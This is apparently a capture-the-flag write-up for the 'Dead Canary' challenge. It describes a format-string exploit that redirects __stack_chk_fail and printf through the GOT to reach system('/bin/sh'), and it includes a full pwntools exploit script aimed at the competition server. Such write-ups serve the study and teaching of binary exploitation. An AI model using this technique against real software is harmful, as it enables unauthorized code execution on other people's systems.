# Dead Canary

First things first: let's run checksec. There's Partial RELRO, and no PIE. This opens a bundle of attacks, but for now let's not comment on that.

Running the program, we get one input. Spamming lots of chars, we get a stack smashing error. That means a canary.

Opening it up in radare2, we can inspect the "hidden" main function. We see it reads 0x120 bytes into rbp-0x110. Buffer overflow? Kinda, but I didn't use it except to trigger a canary mismatch.

Most importantly, it calls printf on our input directly, opening a range of format string attacks. The first thing that pops into mind is a format string overwrite, but what to overwrite? The only libc function called after our input is printf-ed is \_\_stack\_chk\_fail, but that's only called if there's a canary mismatch.

Our goal? Overwrite \_\_stack\_chk\_fail@GOT with the address of main, then trigger a canary mismatch. Everytime the canary mismatches, it'll try to call stack chk fail, but instead it'll just call main again. This gives us infinite calls of main, so we can do whatever we want with format strings including writing and reading before we deliver the final exploit.

I cut my exploit in 4 stages.

* Stage 1: Overwrite \_\_stack\_chk\_fail@got with the address of main. Trigger canary mismatch, main will call again
* Stage 2: Leak \_\_libc\_start\_main\_ret using %77%lp. Make sure to trigger canary mismatch in order to call main again
* Stage 3: Calculate libc base. Overwrite printf@GOT with system@libc. Trigger canary mismatch for the final time.
* Stage 4: Enter /bin/sh. The program will attempt to call printf\("/bin/sh"\), actually calling system\("/bin/sh"\), popping a shell.

Note: remotely, for some reason, the shell is really unstable? After one command it breaks and disconnects. Still some form of temporary shell though, enough to cat flag.txt.

```python
from pwn import *
import sys
context.arch = 'amd64'
NUM_TO_CANARY = 265
mode = sys.argv[1]
fini = 0x0000000000600e18
main = 0x00400737
e = ELF("./canary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6" if mode == 'local' else '/home/kali/Tools/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc.so.6')
def getproc():
    if mode == 'remote':
        return remote('2020.redpwnc.tf',31744)
    else:
        return e.process()
def canarypad(data):
    return data + b'A' * (NUM_TO_CANARY - len(data)) + p64(0x13371337)
def write_fmt(data):
    p = getproc()
    p.recvuntil(": ")
    p.sendline(data)
    p.recvuntil("Hello ")
    output = p.recv()
    p.close()
    return output
libret = 0x21b97 if mode == 'remote' else 0x26e0b

auto = FmtStr(execute_fmt = write_fmt)
writes = {e.got['__stack_chk_fail']: main}
# Stage 1: overwrite __stack_chk_fail
first = fmtstr.fmtstr_payload(auto.offset,writes)
p = getproc()
first = canarypad(first)
p.sendline(first)
p.recvuntil("name: ")
# Stage 2: leak libc address
leak = b"%77$lp."
leak = canarypad(leak)
p.sendline(leak)
p.recvuntil("Hello 0x")
# Stage 3.1: Calculate base
response = int(p.recv().decode().split(".")[0],16)
libcbase = response - libret
log.info(f"Libc start main ret leak: {hex(response)}")
log.info(f"Libc base: {hex(libcbase)}")
libc.address = libcbase
p.clean()
# Stage 3.2 : overwrite printf with system
new_writes = {e.got['printf']: libc.symbols['system']}
final = fmtstr.fmtstr_payload(auto.offset,new_writes)
p.sendline(canarypad(final))
# Stage 4: Send /bin/sh
p.sendline("/bin/sh")
p.interactive()
```

